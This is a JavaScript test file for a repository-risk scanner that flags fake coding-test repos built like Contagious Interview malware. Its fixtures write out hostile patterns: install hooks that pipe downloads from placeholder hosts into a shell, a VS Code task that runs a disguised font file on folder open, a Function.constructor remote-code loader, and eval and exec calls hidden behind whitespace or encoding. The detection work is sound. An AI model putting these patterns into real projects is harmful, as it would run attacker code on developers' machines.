/* Coding-test repo check (extension/lib/repoRisk.js). The malicious
   fixtures follow published Contagious Interview samples: a VS Code task
   that runs a "font" on folder open, an error response compiled with
   Function.constructor, install hooks that pipe a download into a shell, and
   code pushed off-screen behind a run of spaces. Nothing here is run.
   Run: node --test tests/repo-risk.test.mjs */
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { resolve, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import vm from "node:vm";

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const ctx = { URL, Date, JSON, Promise };
ctx.globalThis = ctx;
vm.runInNewContext(readFileSync(resolve(ROOT, "extension/lib/repoRisk.js"), "utf8"), ctx);
const R = ctx.PhishCleanRepoRisk;
const rules = (findings) => [...findings].map((f) => `${f.severity}:${f.rule}`);

/* ── package.json ── */
const pkg = (scripts, extra = {}) => JSON.stringify({ name: "test-app", scripts, ...extra });

test("install hooks that download or run hidden code", () => {
  for (const [hook, cmd] of [
    ["postinstall", "curl -s https://cdn.example/setup.sh | bash"],
    ["preinstall", "node -e \"require('child_process').exec('...')\""],
    ["prepare", "powershell -enc SQBFAFgA"],
    ["install", "wget -q https://x.example/a -O /tmp/a && sh /tmp/a"],
  ]) {
    assert.deepEqual(rules(R.analyzePackageJson("package.json", pkg({ [hook]: cmd })).findings), ["high:install-hook"], hook);
  }
});

test("a script that runs a font file", () => {
  const r = R.analyzePackageJson("package.json", pkg({ start: "node server/index.js && node public/fonts/fa-solid-400.woff2" }));
  assert.deepEqual(rules(r.findings), ["high:disguised-file"]);
  assert.deepEqual([...r.follow], ["server/index.js", "public/fonts/fa-solid-400.woff2"]);
});

test("ordinary scripts stay quiet", () => {
  const r = R.analyzePackageJson("package.json", pkg({
    prepare: "husky install", postinstall: "patch-package", dev: "concurrently \"npm run server\" \"wait-on http://localhost:3000 && npm run client\"",
    "version:release": "node ./node_modules/.bin/changeset version", build: "tsc -p . && node scripts/copy.mjs",
    start: "node --max-old-space-size=4096 dist/server.js"
  }, { dependencies: { express: "^4.19.0", lib: "github:acme/lib#v1" } }));
  assert.deepEqual(rules(r.findings), []);
});

test("nested package.json follows paths relative to itself", () => {
  const r = R.analyzePackageJson("server/package.json", pkg({ postinstall: "node ./scripts/setup.js" }));
  assert.deepEqual([...r.follow], ["server/scripts/setup.js"]);
});

test("dependency fetched from an unknown host", () => {
  const r = R.analyzePackageJson("package.json", pkg({}, { dependencies: { utils: "https://files.example/utils-1.0.0.tgz" } }));
  assert.deepEqual(rules(r.findings), ["medium:remote-dependency"]);
});

/* ── .vscode/tasks.json ── */
const TASKS_FONT = `{
  // keep lint running
  "version": "2.0.0",
  "tasks": [{
    "label": "eslint-check", "type": "shell",
    "command": "node public/font/fa-brands-regular.woff2",
    "presentation": { "reveal": "never", "echo": false },
    "runOptions": { "runOn": "folderOpen" },
  }]
}`;

test("VS Code task that runs a font on folder open", () => {
  const r = R.analyzeVscodeTasks(".vscode/tasks.json", TASKS_FONT);
  assert.deepEqual(rules(r.findings), ["high:vscode-autorun"]);
  assert.deepEqual([...r.follow], ["public/font/fa-brands-regular.woff2"]);
});

test("VS Code task that pipes a download into a shell", () => {
  const t = JSON.stringify({ tasks: [{ label: "env", command: "curl -fsSL https://x.example/$(uname) | sh", runOptions: { runOn: "folderOpen" } }] });
  assert.deepEqual(rules(R.analyzeVscodeTasks(".vscode/tasks.json", t).findings), ["high:vscode-autorun"]);
});

test("a plain watcher on folder open is worth a note, a normal task file is not", () => {
  const watch = JSON.stringify({ tasks: [{ label: "watch", command: "npm run watch", runOptions: { runOn: "folderOpen" } }] });
  assert.deepEqual(rules(R.analyzeVscodeTasks(".vscode/tasks.json", watch).findings), ["medium:vscode-autorun"]);
  const normal = JSON.stringify({ tasks: [{ label: "build", command: "npm run build", group: "build" }] });
  assert.deepEqual(rules(R.analyzeVscodeTasks(".vscode/tasks.json", normal).findings), []);
});

/* ── Source files ── */
const ERROR_LOADER = `const axios = require("axios");
const getPassport = (id) => {
  axios.get(\`http://chainlink-api.example/api/\${id}\`)
    .then((res) => res.data)
    .catch((err) => errorHandler(err.response.data || "404"));
};
const errorHandler = (error) => {
  const handler = new (Function.constructor)("require", error);
  handler(require);
};`;

test("downloads code and runs it with require", () => {
  const f = R.analyzeSource("server/routes/api/profile.js", ERROR_LOADER);
  assert.deepEqual(rules(f), ["high:remote-exec"]);
  assert.match(f[0].detail, /require/);
});

test("code hidden off-screen behind spaces", () => {
  const src = `module.exports = { content: ["./src/**/*.{js,jsx}"], theme: {} };${" ".repeat(400)}eval(atob("Y29uc29sZS5sb2coMSk="))`;
  assert.deepEqual(rules(R.analyzeSource("tailwind.config.js", src)), ["high:hidden-code", "high:decode-exec"]);
});

test("obfuscator output", () => {
  const src = Array.from({ length: 30 }, (_, i) => `var _0x${(0x1a2b + i).toString(16)}=_0x4f21('0x${i}');`).join("");
  assert.deepEqual(rules(R.analyzeSource("config/db.js", src)), ["high:obfuscated"]);
});

test("shell download started from code", () => {
  const src = `const { exec } = require("child_process"); exec("curl -s https://x.example/p | sh");`;
  assert.deepEqual(rules(R.analyzeSource("server/utils/env.js", src)), ["high:download-run"]);
});

test("python decoder", () => {
  const src = "import base64, zlib\nexec(zlib.decompress(base64.b64decode('eJwrzs9NVSguKcrMS1cHAA==')))";
  assert.deepEqual(rules(R.analyzeSource("setup.py", src)), ["high:decode-exec"]);
});

test("paste-site dead drop", () => {
  assert.deepEqual(rules(R.analyzeSource("server/config.js", `fetch("https://api.npoint.io/abc123").then(r => r.json())`)), ["medium:dead-drop"]);
});

test("ordinary server and config code stays quiet", () => {
  const server = `const express = require("express"); const axios = require("axios");
app.get("/api/price", async (req, res) => { const r = await axios.get("https://api.coingecko.com/x"); res.json(r.data); });`;
  const webpack = `module.exports = { mode: "production", module: { rules: [{ test: /\\.js$/, use: "babel-loader" }] } };`;
  const inlineImage = `export const logo = "data:image/png;base64,${"iVBORw0KGgo".repeat(200)}";`;
  for (const [path, src] of [["server/index.js", server], ["webpack.config.js", webpack], ["src/logo.js", inlineImage]]) {
    assert.deepEqual(rules(R.analyzeSource(path, src)), [], path);
  }
});

/* ── File list, README, URL parsing ── */
test("program files in the tree, but not in test fixtures", () => {
  assert.deepEqual(rules(R.analyzeTree(["README.md", "tools/driver-update.exe"])), ["medium:binaries"]);
  assert.deepEqual(rules(R.analyzeTree(["test/fixtures/installer.exe", "android/gradle/wrapper/gradle-wrapper.jar"])), []);
});

test("coding-test README", () => {
  assert.equal(R.isCodingTest("# Take-home assessment\nClone the repo, run `npm install` and `npm start`, then fix the bug."), true);
  assert.equal(R.isCodingTest("# Express\nFast, unopinionated web framework. npm install express"), false);
});

test("repo URLs", () => {
  const p = (u) => { const r = R.parseRepoUrl(u); return r && `${r.host} ${r.owner}/${r.repo}`; };
  assert.equal(p("https://github.com/acme/take-home/tree/main/server"), "github acme/take-home");
  assert.equal(p("github.com/acme/take-home.git"), "github acme/take-home");
  assert.equal(p("https://gitlab.com/group/sub/proj/-/blob/main/x.js"), "gitlab group/sub/proj");
  assert.equal(p("https://bitbucket.org/acme/test-task/src/main/"), "bitbucket acme/test-task");
  assert.equal(p("https://github.com/settings/profile"), null);
  assert.equal(p("https://github.com/acme"), null);
  assert.equal(p("https://example.com/acme/repo"), null);
});

/* ── End to end against a mocked GitHub ── */
function mockGithub(files, meta = {}) {
  const raw = "https://raw.githubusercontent.com/acme/test-task/main/";
  const seen = [];
  const fetchFn = async (url) => {
    seen.push(url);
    const json = (body) => ({ ok: true, status: 200, json: async () => body, text: async () => JSON.stringify(body) });
    if (url === "https://api.github.com/repos/acme/test-task") {
      return json({ default_branch: "main", created_at: "2026-10-20T00:00:00Z", stargazers_count: 0, fork: false, ...meta });
    }
    if (url.startsWith("https://api.github.com/repos/acme/test-task/git/trees/main")) {
      return json({ tree: Object.keys(files).map((path) => ({ path, type: "blob", size: files[path].length })) });
    }
    if (url.startsWith(raw)) {
      const path = decodeURIComponent(url.slice(raw.length));
      return path in files ? { ok: true, status: 200, text: async () => files[path] } : { ok: false, status: 404 };
    }
    return { ok: false, status: 404 };
  };
  return { fetchFn, seen };
}

test("end to end: the Contagious Interview layout", async () => {
  const { fetchFn } = mockGithub({
    "README.md": "# Technical assessment\nRun `npm install` then `npm start` and fix the login bug.",
    "package.json": pkg({ start: "node server/index.js" }),
    ".vscode/tasks.json": TASKS_FONT,
    "public/font/fa-brands-regular.woff2": ERROR_LOADER,
    "server/index.js": "require('./routes/api/profile');",
    "server/routes/api/profile.js": ERROR_LOADER,
    ...Object.fromEntries(Array.from({ length: 40 }, (_, i) => [`server/models/m${i}.js`, "module.exports = {};"])),
  });
  const r = await R.checkRepo(R.parseRepoUrl("https://github.com/acme/test-task"), fetchFn);
  assert.equal(r.verdict, "danger");
  assert.equal(r.codingTest, true);
  const got = rules(r.findings);
  assert.ok(got.includes("high:vscode-autorun"), got.join());
  assert.ok(r.findings.some((f) => f.file === "public/font/fa-brands-regular.woff2" && f.rule === "remote-exec"), "the file the task runs is read and flagged");
  assert.ok(r.filesChecked.length <= 20);
});

test("end to end: a clean repo, and an established one that is skipped", async () => {
  const files = { "README.md": "# Todo app", "package.json": pkg({ start: "node index.js" }), "index.js": "console.log('hi')" };
  const clean = await R.checkRepo(R.parseRepoUrl("github.com/acme/test-task"), mockGithub(files).fetchFn);
  assert.equal(clean.verdict, "clean");
  assert.deepEqual(rules(clean.findings), []);

  const { fetchFn, seen } = mockGithub(files, { stargazers_count: 40000, created_at: "2015-01-01T00:00:00Z" });
  const skipped = await R.checkRepo(R.parseRepoUrl("github.com/acme/test-task"), fetchFn, { skipEstablished: true });
  assert.equal(skipped.verdict, "skipped");
  assert.equal(seen.length, 1, "only the repo details were requested");
});

test("end to end: missing repo and rate limit", async () => {
  const notFound = async () => ({ ok: false, status: 404 });
  await assert.rejects(R.checkRepo(R.parseRepoUrl("github.com/acme/gone"), notFound), (e) => e.code === "not-found");
  const limited = async () => ({ ok: false, status: 403 });
  await assert.rejects(R.checkRepo(R.parseRepoUrl("github.com/acme/x"), limited), (e) => e.code === "rate-limit");
});
